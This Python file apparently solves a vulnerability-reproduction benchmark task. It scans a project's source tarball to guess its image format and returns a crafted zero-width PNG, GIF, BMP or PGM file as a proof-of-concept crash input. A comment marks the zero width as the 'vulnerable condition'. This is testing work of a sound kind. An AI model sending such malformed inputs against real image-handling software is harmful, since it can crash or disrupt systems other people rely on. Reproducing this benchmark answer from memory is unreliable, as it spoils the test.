import os
import tarfile
import tempfile
import shutil
import struct
import zlib
import collections
import base64


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            return self._solve_impl(src_path)
        except Exception:
            # As a last resort, return a simple zero-dimension PNG PoC
            return self._make_png_zero_dim()

    def _solve_impl(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            # Try to extract the tarball, but ignore errors – detection will fall back.
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
            except Exception:
                pass

            fmt = self._detect_format(tmpdir)
            if fmt == "gif":
                return self._make_gif_zero_dim()
            elif fmt == "bmp":
                return self._make_bmp_zero_dim()
            elif fmt == "pnm":
                return self._make_pnm_zero_dim()
            else:
                # Default / most likely: PNG
                return self._make_png_zero_dim()
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def _detect_format(self, root: str) -> str:
        """
        Heuristically detect the primary image format used by the project.
        Strongly prefers PNG unless there is clear evidence for another format.
        """
        if not os.path.isdir(root):
            return "png"

        scores = collections.Counter()

        png_kw = (
            b"libpng",
            b"png_struct",
            b"png.h",
            b"PNG_LIBPNG_VER",
            b"spng_",
            b"lodepng",
            b"IHDR",
            b"PNG_SIGNATURE",
        )
        gif_kw = (
            b"gif_lib",
            b"GifFileType",
            b"DGifOpen",
            b"EGifOpen",
            b".gif",
        )
        bmp_kw = (
            b"BITMAPINFOHEADER",
            b".bmp",
            b"BM_MAGIC",
            b"BMPFILEHEADER",
        )
        pnm_kw = (
            b"pnm",
            b"ppm",
            b"pgm",
            b"pbm",
            b"P5",
            b"P6",
        )

        for dirpath, dirnames, filenames in os.walk(root):
            dlower = dirpath.lower()
            if "png" in dlower:
                scores["png"] += 1
            if "gif" in dlower:
                scores["gif"] += 1
            if "bmp" in dlower:
                scores["bmp"] += 1
            if any(x in dlower for x in ("pnm", "ppm", "pgm", "pbm")):
                scores["pnm"] += 1

            for fname in filenames:
                lower = fname.lower()
                fpath = os.path.join(dirpath, fname)

                # Name-based hints
                if "png" in lower:
                    scores["png"] += 3
                if "gif" in lower:
                    scores["gif"] += 3
                if "bmp" in lower:
                    scores["bmp"] += 3
                if any(x in lower for x in ("pnm", "ppm", "pgm", "pbm")):
                    scores["pnm"] += 3

                # Only read reasonably small, likely-text files
                try:
                    size = os.path.getsize(fpath)
                except OSError:
                    continue
                if size > 512000:
                    continue
                if not lower.endswith(
                    (
                        ".c",
                        ".cc",
                        ".cpp",
                        ".h",
                        ".hpp",
                        ".txt",
                        "cmakelists.txt",
                        "makefile",
                        ".md",
                        ".cmake",
                        ".in",
                    )
                ):
                    continue

                try:
                    with open(fpath, "rb") as fh:
                        data = fh.read()
                except OSError:
                    continue

                for kw in png_kw:
                    if kw in data:
                        scores["png"] += 4
                for kw in gif_kw:
                    if kw in data:
                        scores["gif"] += 4
                for kw in bmp_kw:
                    if kw in data:
                        scores["bmp"] += 4
                for kw in pnm_kw:
                    if kw in data:
                        scores["pnm"] += 4

        if not scores:
            return "png"

        best_fmt, best_score = scores.most_common(1)[0]

        # Require a bit of confidence to move away from PNG
        png_score = scores.get("png", 0)
        if best_fmt != "png":
            if best_score < 3 or best_score < png_score + 2:
                return "png"

        if best_score <= 1:
            return "png"

        return best_fmt

    def _make_png_zero_dim(self) -> bytes:
        """
        Create a minimal PNG with zero width (and non-zero height) that is otherwise well-formed.
        """
        png_sig = b"\x89PNG\r\n\x1a\n"
        out = bytearray(png_sig)

        def make_chunk(ctype: bytes, cdata: bytes) -> bytes:
            length = struct.pack(">I", len(cdata))
            crc = zlib.crc32(ctype)
            crc = zlib.crc32(cdata, crc) & 0xFFFFFFFF
            return length + ctype + cdata + struct.pack(">I", crc)

        # IHDR: width = 0, height = 1, bit depth 8, color type 2 (RGB), compression 0, filter 0, interlace 0
        width = 0
        height = 1
        ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
        out += make_chunk(b"IHDR", ihdr_data)

        # IDAT: compressed data for a single scanline of a 1x1 RGB image (filter byte + 3 bytes RGB)
        raw_scanline = b"\x00\xff\x00\x00"  # filter=0, RGB=(255,0,0)
        compressed = zlib.compress(raw_scanline)
        out += make_chunk(b"IDAT", compressed)

        # IEND
        out += make_chunk(b"IEND", b"")
        return bytes(out)

    def _make_gif_zero_dim(self) -> bytes:
        """
        Start from a standard 1x1 transparent GIF and force width to zero.
        """
        try:
            # Canonical 1x1 transparent GIF used on the web
            b64 = b"R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=="
            gif = bytearray(base64.b64decode(b64))
        except Exception:
            # Fallback: trivial, possibly invalid GIF header with zero size
            header = bytearray(b"GIF89a")
            header += b"\x00\x00"  # width = 0
            header += b"\x00\x00"  # height = 0
            header += b"\x80"      # GCT flag set, 2 colors
            header += b"\x00"      # bg color index
            header += b"\x00"      # pixel aspect
            header += b"\x00\x00\x00\xff\xff\xff"  # color table: black, white
            header += b"\x3b"      # trailer
            return bytes(header)

        if len(gif) >= 10:
            # Logical Screen Width (bytes 6-7)
            gif[6] = 0
            gif[7] = 0  # width = 0
            # Leave height as 1 (bytes 8-9) to ensure some processing path
        return bytes(gif)

    def _make_bmp_zero_dim(self) -> bytes:
        """
        Create a minimal BMP with width=0 and non-zero height.
        """
        bpp = 24
        width_nominal = 1
        height = 1

        # BMP rows are padded to multiples of 4 bytes
        row_bytes = ((width_nominal * bpp + 31) // 32) * 4
        pixel_data = b"\x00\x00\xff" + b"\x00" * (row_bytes - 3)  # one blue pixel row
        pixel_data_size = len(pixel_data)

        file_header_size = 14
        dib_header_size = 40
        offset = file_header_size + dib_header_size
        file_size = offset + pixel_data_size

        # BITMAPFILEHEADER
        header = bytearray()
        header += b"BM"
        header += struct.pack("<I", file_size)
        header += b"\x00\x00\x00\x00"  # reserved
        header += struct.pack("<I", offset)

        # BITMAPINFOHEADER
        dib = bytearray()
        dib += struct.pack("<I", dib_header_size)
        dib += struct.pack("<i", 0)           # width = 0 (vulnerable condition)
        dib += struct.pack("<i", height)      # height = 1
        dib += struct.pack("<H", 1)          # planes
        dib += struct.pack("<H", bpp)        # bits per pixel
        dib += struct.pack("<I", 0)          # BI_RGB (no compression)
        dib += struct.pack("<I", pixel_data_size)
        dib += struct.pack("<I", 0)          # x pixels per meter
        dib += struct.pack("<I", 0)          # y pixels per meter
        dib += struct.pack("<I", 0)          # colors used
        dib += struct.pack("<I", 0)          # important colors

        return bytes(header + dib + pixel_data)

    def _make_pnm_zero_dim(self) -> bytes:
        """
        Create a minimal PGM (P5) PNM file with width=0, height=1.
        """
        header = b"P5\n0 1\n255\n"
        # Provide one byte of pixel data even though width=0; some loaders
        # may mis-handle this mismatch.
        data = b"\x00"
        return header + data